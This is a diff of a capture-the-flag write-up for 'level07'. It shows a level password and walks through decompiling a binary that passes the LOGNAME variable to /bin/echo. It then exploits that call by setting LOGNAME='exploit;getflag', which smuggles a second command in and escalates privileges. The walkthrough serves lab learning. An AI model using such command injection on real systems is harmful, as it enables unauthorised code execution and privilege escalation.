@@ -1,36 +1,30 @@
 # level07
 
-1. examinate existing files permissions
+## Vulnerability: Environnement variable trickery leading to code injection
+
+level07's password: `wiok45aaoguiboiki2tuin6ub`
+
+1. examinate existing files and permissions
 
 ```shell
 ls -la
 ```
 
-shows that the level07 executable belongs to flag07 group
+shows that the level07 executable belongs to flag07 group, privilege escalation should be possible
 
-2. get the executable (from an external device)
+2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code
 
 ```shell
 scp -P 4242 level07@<host>:level07 .
-```
-
-3. decompile the executable and examine the resulting code
-
-```shell
-~/dev/tools/retdec/bin/retdec-decompiler.py level07
+retdecomp level07
 ```
 
 shows `asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));` which permits arbitrary code execution
 
-4. tweak the environment variables
+4. tweak the environment variables and pwn the flag
 
 ```shell
 LOGNAME='exploit;getflag'
-```
-
-5. pwn the flag
-
-```shell
 ./level07
 ```
 
